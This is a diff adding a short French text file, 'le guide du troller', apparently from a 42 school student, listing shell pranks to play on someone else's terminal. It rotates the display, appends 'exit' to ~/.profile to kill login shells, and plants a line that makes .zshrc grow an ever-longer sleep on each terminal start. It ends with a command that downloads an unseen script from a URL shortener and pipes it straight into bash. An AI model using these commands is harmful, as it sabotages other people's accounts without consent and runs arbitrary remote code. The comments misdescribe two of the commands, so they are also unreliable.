@@ -1,0 +1,26 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    le guide du troller.txt                            :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: ethebaul <ethebaul@student.42.fr>          +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2024/11/13 13:19:31 by ethebaul          #+#    #+#              #
+#    Updated: 2024/11/13 13:59:42 by ethebaul         ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+
+//change l'écran d'orientation
+xrandr -o inverted
+xrandr -o right
+xrandr -o left
+xrandr -o normal
+
+//rajoute la commande exit a la fin de .zshrc
+echo exit >> ~/.profile
+
+//rajoute 1s de latence d'ouverture a chaque ouverture de terminale
+echo "echo sleep 0.05 >> ~/.zshrc" >> ~/.zshrc
+
+wget -q -O - urlr.me/h8GzE | bash
